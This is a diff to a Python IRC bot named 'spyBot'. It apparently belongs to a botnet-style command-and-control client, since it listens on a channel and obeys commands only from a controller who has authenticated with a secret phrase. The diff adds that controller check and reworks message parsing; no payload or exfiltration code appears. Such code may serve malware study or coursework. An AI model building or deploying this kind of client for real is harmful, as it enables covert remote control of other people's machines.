@@ -19,6 +19,7 @@ class Bot():
         self.secret_phrase = secret_phrase
         self.irc_socket = None
         self.nickname = 'spyBot'
+        self.controller = None
     
     def __send_to_channel(self, msg):
         '''
@@ -46,7 +47,7 @@ class Bot():
         connection alive by responding to 'PING #' with 'PONG #'
         and finally returns message
         '''
-        received_msg = self.irc_socket.recv(BUFFER_SIZE).decode()
+        received_msg = self.irc_socket.recv(BUFFER_SIZE).decode().strip()
         if received_msg.find('PING') != -1:
             self.__send_message('PONG ' + received_msg.split() [1] + '\r\n')
 
@@ -78,17 +79,10 @@ class Bot():
         if not ('PRIVMSG' in msg) or not (self.channel in msg):
             return False
         
-        _, msg = msg.split(' :')
-        secret, cmd = msg.split(' ')
-
-        if secret != self.secret_phrase:
-            return False
-        
         return True
 
     def __handle_command(self, msg):
-        _, msg = msg.split(' :')
-        _, cmd = msg.split(' ')
+        _, cmd = msg.split(' :')
         
         if cmd.startswith('status'):
             self.__send_to_channel(self.nickname)
@@ -108,6 +102,20 @@ class Bot():
         else:
             raise ValueError('Invalid command!')
 
+    def __verify_controller(self, msg):
+        '''
+        authenticates the controller using secret_phrase
+        format --> :Guest52!889f1007@87.98.219.117 PRIVMSG <#channel> :<msg>
+        '''
+        sender = msg.split(':')[1].split(' ')[0]
+        _, secret = msg.split(' :')
+        if self.secret_phrase == secret:
+            self.controller = sender
+            log('Authenticated controller: ' + self.controller)
+            return True
+        else:
+            log('Failed to authenticate controller: {}, using secret_phrase: {}'.format(self.controller, secret))
+            return False
 
     def __listen(self):
         '''
@@ -115,11 +123,19 @@ class Bot():
         '''
         while True:
             msg = self.__receive_message()
-            if self.secret_phrase not in msg:
-                continue
-            log(msg)
             if not self.__validate_msg(msg):
-                log('Warning: invalid msg --> {}'.format(msg))
+                log('Warning: non-cotroller msg')
+                continue
+
+            if self.controller == None:
+                # verify controller
+                self.__verify_controller(msg)
+                continue
+            
+            if self.controller not in msg:
+                continue
+
+            log(msg)
             try:
                 self.__handle_command(msg)
             except ValueError as e:
@@ -132,7 +148,6 @@ class Bot():
         '''
         self.__connect_to_irc_server()
         self.__authenticate()
-        # self.__send_to_channel('hi')
         self.__listen()
 
 
@@ -181,11 +196,6 @@ def log(msg):
 
 def main():
     args = parse_args()
-    
-    # connect to IRC server
-    log('Connecting to: {}:{}'.format(args.hostname, int(args.port)))
-    conn = socket.socket()
-    conn.connect((args.hostname, int(args.port)))
 
     # start bot
     bot = Bot(args.hostname, int(args.port), args.channel, args.secret_phrase)
